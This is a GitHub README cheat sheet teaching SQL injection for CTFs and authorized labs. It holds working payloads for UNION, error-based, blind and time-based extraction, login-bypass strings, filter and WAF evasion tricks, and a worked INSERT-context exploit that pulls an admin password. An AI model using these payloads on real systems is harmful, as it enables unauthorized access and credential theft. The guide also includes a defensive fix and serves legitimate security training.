   # 🔍 SQLi Identification for Hackathons

> **A practical SQL Injection field guide for CTFs & authorized labs.**  
> Learn to **identify → confirm → fingerprint → exploit → enumerate** SQLi under time pressure.

## 👤 Author

**IamjustaShinobi**  
🐙 **GitHub:** [github.com/IamjustaShinobi](https://github.com/IamjustaShinobi)

A practical, beginner-friendly cheat sheet for **spotting, confirming, fingerprinting, and exploiting SQL Injection** during CTFs and hackathons.

Built from a real solved challenge and generalized into a repeatable methodology, this guide is designed to take you from **“What even is SQLi?”** to **“I can identify and exploit it under time pressure.”**

> ⚠️ This repo is a study/reference guide, not an attack tool. Use it only on systems you're authorized to test — CTF boxes, your own labs, or platforms like PortSwigger, TryHackMe, and HackTheBox.

---

---

## 📚 Table of Contents

| # | Section |
|---|---|
| 01 | [🎯 Why SQLi Still Matters in CTFs](#-why-sqli-still-matters-in-ctfs) |
| 02 | [✅ Quick Identification Checklist](#-quick-identification-checklist) |
| 03 | [🕵️ Fingerprinting the Database](#-fingerprinting-the-database) |
| 04 | [🧠 Understanding Query Context](#-understanding-query-context) |
| 05 | [🧾 Payload Cheat Sheet by Context](#-payload-cheat-sheet-by-context) |
| 06 | [🧬 The 4 Classes of SQLi](#-the-4-classes-of-sqli) |
| 07 | [🗂️ Enumeration Once You Have Injection](#-enumeration-once-you-have-injection) |
| 08 | [🧩 Worked Example: INSERT-context Injection](#-worked-example-insert-context-injection) |
| 09 | [🚧 Common Filters and How They're Bypassed](#-common-filters-and-how-theyre-bypassed) |
| 10 | [🛡️ Defensive Reference](#-defensive-reference-how-its-fixed) |
| 11 | [📈 Practice Roadmap](#-practice-roadmap) |
| 12 | [📚 Resources](#-resources) |


---

---

## 🎯 Why SQLi Still Matters in CTFs

Even though frameworks and ORMs make parameterized queries the default nowadays, SQLi keeps showing up in CTFs and hackathons because:

- Challenge authors intentionally use raw string interpolation (`db.raw(\`...${input}...\`)`) to teach the vulnerability.
- Real-world codebases still mix safe and unsafe query patterns in the same file — one safe `SELECT` next to one unsafe `INSERT` is extremely common (see the worked example below).
- It's a gateway bug: once you can read arbitrary rows from a database, you often pivot into auth bypass, privilege escalation, or direct flag retrieval.
- It rewards methodical thinking over memorized payloads — which is exactly what this repo tries to teach.

---

---

## ✅ Quick Identification Checklist

Run through this on every new target, in order:

1. **Map the full attack surface first.** Don't just test the obvious login box. List:
   - URL query params (`?id=1`, `?sort=name`, `?category=books`)
   - Form fields (login, signup, search, comments, "create" forms)
   - JSON body keys in API requests (check dev tools / Burp for the actual request shape)
   - Headers that get logged or used server-side: `User-Agent`, `X-Forwarded-For`, `Referer`
   - Cookies, especially anything that looks like an ID or token
   - File upload metadata (filename, EXIF fields) — occasionally reaches SQL too

2. **Throw a single quote (`'`) at each one, one at a time.** Watch for:
   - A raw database error message (best case — tells you the DBMS immediately)
   - A generic 500 error where there wasn't one before
   - A blank/broken page
   - Any change in response length or timing vs. a baseline request

3. **Try balancing/closing payloads** to see if you can make the query valid again (confirms control over structure, not just causing an error):
   ```
   ' OR '1'='1
   " OR "1"="1
   ') OR ('1'='1
   ')) OR (('1'='1
   1 OR 1=1        -- numeric context, no quotes needed
   ```
   If `' OR '1'='1` logs you in as the first user, or a search box suddenly returns *everything*, you've confirmed injection and rough context.

4. **Identify exactly which clause you're injecting into** — this determines which technique will actually work:

   | Context | Typical location | Technique to use |
   |---|---|---|
   | `SELECT ... WHERE` | Login, search, filter boxes | UNION-based, boolean-blind, error-based |
   | `INSERT ... VALUES(...)` | Signup, "create post/secret/comment" forms | `\|\|` / `+` / `CONCAT()` with a scalar subquery — **UNION will syntax-error here** |
   | `UPDATE ... SET` | Profile edits, settings forms | Same rule as INSERT — concatenation, not UNION |
   | `ORDER BY` | `?sort=`, `?order=` params | Can't subquery directly; use `CASE WHEN` or boolean/time-blind |
   | `LIMIT` / numeric-only fields | Pagination params | Usually no quotes needed; test with `CASE WHEN` in numeric position |

5. **Match your technique to the feedback level the app gives you** (see [The 4 Classes of SQLi](#-the-4-classes-of-sqli)) — this is the single most important decision in the whole process, since picking the wrong class wastes the most time in a timed CTF.

---

---

## 🕵️ Fingerprinting the Database

Knowing the exact DBMS before you write payloads saves huge amounts of time — concatenation, comments, and metadata tables all differ.

### By error message
| Signal | Likely DB |
|---|---|
| `you have an error in your SQL syntax` | MySQL / MariaDB |
| `unterminated quoted string`, uses `\|\|` for concat | PostgreSQL / Oracle / SQLite |
| `Incorrect syntax near`, uses `+` for concat, `xp_cmdshell` exists | MSSQL |
| `ORA-00933`, `ORA-01756` | Oracle |
| `SQLITE_ERROR` | SQLite |

### By function/probe behavior
| Probe | Works on |
|---|---|
| `version()` | PostgreSQL, MySQL |
| `@@version` | MySQL, MSSQL |
| `sqlite_version()` | SQLite |
| `banner FROM v$version` | Oracle |
| `SELECT 1;-- ` (semicolon + comment accepted) | Usually MSSQL/Postgres; MySQL is pickier about stacked queries via web input |

### By comment syntax
| Syntax | DBMS |
|---|---|
| `-- ` (note the trailing space is required) | MySQL |
| `--` (no trailing space needed) | PostgreSQL, MSSQL, Oracle, SQLite |
| `#` | MySQL only |
| `/* ... */` | Universal — works everywhere, safest bet if unsure |

### By concatenation operator (see also §Payload Cheat Sheet)
| Operator | DBMS |
|---|---|
| `\|\|` | PostgreSQL, Oracle, SQLite |
| `CONCAT(a, b)` | MySQL, MSSQL (also works in Postgres) |
| `+` | MSSQL |

### By information schema access
Once you have any read access, this table tells you a lot on its own:
```sql
SELECT table_name FROM information_schema.tables;   -- works on MySQL, PostgreSQL, MSSQL
SELECT name FROM sqlite_master WHERE type='table';   -- SQLite-specific equivalent
SELECT table_name FROM all_tables;                   -- Oracle-specific equivalent
```

---

---

## 🧠 Understanding Query Context

The single biggest beginner mistake is throwing UNION payloads at everything. **UNION only works inside a `SELECT`.** If your input lands inside `INSERT`, `UPDATE`, or `ORDER BY`, UNION is grammatically invalid there and will always throw a syntax error — no amount of payload tweaking fixes that, because the problem is the clause, not the payload.

Think of it this way:

```
SELECT * FROM x WHERE y = '<here>'        →  UNION-based, boolean-blind, error-based all valid
INSERT INTO x VALUES ('a', '<here>')      →  Only scalar expressions valid: '' || (subquery) || ''
UPDATE x SET col = '<here>'               →  Same as INSERT — scalar expressions only
ORDER BY <here>                           →  No subquery in most DBs; use CASE WHEN + boolean/time
```

If you get a syntax error on UNION, don't assume the app isn't vulnerable — check whether you're actually inside a non-`SELECT` clause first. Switching from a set-based technique (UNION) to an expression-based one (`\|\|`, `CASE WHEN`) is often all it takes.

---

---

## 🧾 Payload Cheat Sheet by Context

**Inside a `SELECT` (UNION-based):**
```sql
' UNION SELECT username, password FROM users--
```
Match column count first with:
```sql
' ORDER BY 1--
' ORDER BY 2--   -- increment until it errors
```

**Inside `INSERT`/`UPDATE` (UNION won't parse here — use concatenation):**
```sql
-- PostgreSQL / Oracle / SQLite
' || (SELECT password FROM users WHERE username='admin') || '

-- MSSQL
' + (SELECT password FROM users WHERE username='admin') + '

-- MySQL
', (SELECT password FROM users WHERE username='admin'), '   -- via CONCAT() if needed
```

**Error-based (leak data via the error message):**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Boolean-blind (page behaves differently for true/false):**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**Time-blind (no visible difference at all):**
```sql
-- PostgreSQL
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin')--

-- MySQL
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--

-- MSSQL
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--
```

**Inside `ORDER BY` (no direct subquery — use CASE WHEN to trigger a visible/timing difference):**
```sql
-- Boolean-style: valid vs invalid column name flips a visible error
1 AND (CASE WHEN (1=1) THEN id ELSE username END)

-- Time-based
(CASE WHEN (1=1) THEN (SELECT pg_sleep(5)) ELSE NULL END)
```

**Auth bypass in a login form (classic first payload to try):**
```sql
' OR '1'='1'--
' OR '1'='1'#            -- MySQL, using # as comment
admin'--                 -- comment out the password check entirely
```

---

---

## 🧬 The 4 Classes of SQLi

```
                     ┌────────────────────────┐
                     │     SQL Injection       │
                     └────────────┬────────────┘
        ┌───────────────┬─────────┴─────────┬───────────────┐
        ▼               ▼                   ▼               ▼
   In-Band SQLi   Inferential/Blind    Out-of-Band      Second-Order
   (data shown     (infer via true/     (data exits       (stored safely,
    directly)       false or timing)     via DNS/HTTP)     unsafely reused
                                                             later)
```

| Type | You see | When to use |
|---|---|---|
| **In-band (error/UNION)** | Data straight in the response | Best case — app reflects query output or DB errors |
| **Blind (boolean/time)** | Nothing directly, only behavior/delay | App suppresses errors and output |
| **Out-of-band** | Nothing at all, even timing | DB has outbound network access (rare in CTFs) |
| **Second-order** | Bug triggers later, in a *different* query | Payload gets stored, then unsafely reused elsewhere |

---

---

## 🗂️ Enumeration Once You Have Injection

Confirming injection is only step one — in a CTF you still need to find the flag. Standard enumeration order:

1. **Confirm column count** (needed for UNION):
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--   -- keep going until it errors, last working number = column count
   ```
2. **Find which columns reflect in the response:**
   ```sql
   ' UNION SELECT NULL,NULL,NULL--
   ' UNION SELECT 'a','b','c'--   -- see which letters show up on the page
   ```
3. **Enumerate database/table/column names:**
   ```sql
   ' UNION SELECT table_name, NULL FROM information_schema.tables--
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
   ```
4. **Pull the data:**
   ```sql
   ' UNION SELECT username, password FROM users--
   ```
5. **If output is filtered/blind, script the extraction** — most people reach for `sqlmap` here rather than hand-rolling boolean/time-blind loops, but understanding the manual version (Part 3.2 of the payload cheat sheet) is what lets you adapt when sqlmap's defaults don't fit a custom CTF app.

---

---

## 🧩 Worked Example: INSERT-context Injection

A real case where **UNION failed but concatenation worked** — useful for pattern-matching future challenges.

**Vulnerable code:**
```js
const content = req.body.content;
await db.raw(
  `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
);
```

**Why UNION didn't work:** `INSERT ... VALUES(...)` expects a single scalar value per column, not a result set — `UNION SELECT` is only valid syntax inside a `SELECT`.

**Payload that worked:**
```sql
' || ( SELECT password from users where username = 'admin') || '
```

**Reconstructed query:**
```sql
INSERT INTO secrets(owner_id, content)
VALUES (
  '<userId>',
  '' || ( SELECT password from users where username = 'admin') || ''
)
```

The leading `'` in the payload closes the developer's string early. From there, `||` (concat) glues an empty string, a **scalar subquery** (must return exactly 1 row/1 column), and another empty string — collapsing to just the admin's password, which then gets stored in `content` and displayed back via a normal, safe `SELECT`.

**Key takeaway:** when UNION throws a syntax error, check what clause you're actually inside. If it's `INSERT`/`UPDATE`, switch to concatenation operators (`||`, `+`, `CONCAT()`) with a scalar subquery instead.

---

---

## 🚧 Common Filters and How They're Bypassed

CTF apps often add naive filtering instead of fixing the root cause. These are worth trying when your straightforward payload gets blocked (again — authorized targets only):

| Filter | Bypass idea |
|---|---|
| Blocks the word `SELECT` (case-sensitive) | Try `SeLeCt`, or comment-split: `SEL/**/ECT` |
| Blocks spaces | Use `/**/`, tabs, or newlines instead of spaces: `'OR/**/1=1--` |
| Blocks `'` (single quote) | Use numeric context if possible, or hex/char encoding of strings depending on DBMS |
| Blocks `--` and `#` | Use `/* comment */` to close out the rest of the query instead |
| Blocks `UNION` | Confirm you're not actually in a non-SELECT clause first (§Understanding Query Context); if you are in a SELECT, try `UNI/**/ON` or double encoding |
| Strips `OR`/`AND` once | Try `ORR`/`ANDD` — if the filter does a single non-recursive `replace()`, stripping `OR` from `ORR` leaves `R`... but stripping it from `OOR` leaves `OR`. Test both directions. |
| WAF blocks common payloads outright | Slow down — go blind/time-based with unusual syntax, or rotate casing/whitespace tricks above |

If you're unsure whether a filter is doing simple string matching or something smarter, testing single techniques (just spaces, just casing) in isolation tells you a lot about how naive the filter is.

---

---

## 🛡️ Defensive Reference (how it's fixed)

```js
// ❌ Vulnerable — string interpolation
await db.raw(`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`);

// ✅ Fixed — parameterized query
await db.raw(`INSERT INTO secrets(owner_id, content) VALUES (?, ?)`, [userId, content]);
```

Parameterized queries send the SQL **structure** and the **data** to the database separately. The query plan is compiled before your data ever arrives, so characters like `'` or `||` in your input can never be reinterpreted as code — they're just stored as literal text.

---

---

## 📈 Practice Roadmap

1. **PortSwigger Web Security Academy** (free) — UNION attacks → Blind SQLi → SQLi in different contexts.
2. **picoCTF** — beginner-friendly web exploitation archive.
3. **TryHackMe** — "SQL Injection Lab," "OWASP Top 10" rooms.
4. **HackTheBox** — Starting Point tier, then general web boxes.
5. **OWASP Juice Shop** (self-hosted via Docker) — full-app attack surface practice.
6. **Live CTFs** (CTFtime-listed events) — apply it all under time pressure.

---

---

## 📚 Resources

- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide — Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap documentation](https://github.com/sqlmapproject/sqlmap/wiki)

---

---

## ⭐ Final Takeaway

> **Don't memorize payloads. Understand the query context.**

The fastest way to solve SQLi challenges is to identify **where your input lands**, determine **how the application responds**, fingerprint the **DBMS**, and then choose the technique that fits.

**Built while learning SQLi hands-on. PRs and improvements are welcome.**

---

<p align="center">
  <b>🔐 Learn ethically • Practice legally • Hack responsibly</b>
</p>
